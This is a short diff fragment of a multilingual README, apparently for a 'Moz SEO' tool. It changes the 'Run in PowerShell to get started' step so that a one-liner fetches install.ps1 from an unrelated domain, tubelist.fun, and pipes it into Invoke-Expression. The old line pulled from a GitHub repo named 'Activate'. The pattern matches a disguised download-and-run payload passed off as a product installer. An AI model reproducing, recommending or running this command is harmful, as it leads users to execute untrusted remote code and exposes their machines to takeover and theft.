@@ -13,7 +13,7 @@ Resumo (Portuguese) — Moz SEO fornece ferramentas essenciais para rastreamento
 Run in PowerShell to get started:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ### Caracteristicas (Spanish)
